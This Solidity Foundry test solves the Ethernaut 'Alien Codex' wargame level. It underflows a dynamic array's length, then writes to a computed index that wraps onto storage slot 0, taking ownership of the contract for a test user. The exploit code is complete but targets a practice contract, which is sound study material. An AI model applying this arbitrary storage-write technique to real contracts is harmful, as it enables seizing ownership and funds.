// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//ref https://coinsbench.com/19-alien-codex-ethernaut-explained-2ee090c89997

//^0.8 cannot work well

import "../src/AlienCodex/AlienCodex.sol";
import "../src/AlienCodex/AlienCodexFactory.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract AlienCondexTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testAlienCondex() public {
        AlienCondexFactory factory = new AlienCondexFactory();
        address instance = factory.createInstance(_alice);
        AlienCodex(instance).make_contact();
        AlienCodex(instance).retract();
        uint256 n = uint256(keccak256(abi.encode(uint256(1))));
        console.log(n);
        console.log(type(uint256).max - n + 1);
        AlienCodex(instance).revise(
            //The index that overrides slot 0
            type(uint256).max - n + 1,
            bytes32(uint256(uint160(_alice)))
        );
        factory.validateInstance(payable(instance), _alice);
    }
}
